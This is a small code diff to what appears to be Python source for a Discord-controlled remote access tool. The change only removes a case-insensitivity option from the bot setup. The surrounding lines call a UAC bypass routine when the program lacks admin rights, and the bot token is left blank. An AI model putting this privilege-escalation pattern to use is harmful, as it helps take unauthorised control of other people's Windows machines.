@@ -24,7 +24,7 @@ if not IsAdmin():
         if uac_bypass.UACbypass():
             os._exit(0)
 
-client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
+client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all())
 
 bot_token = ""
 guild_ids = []
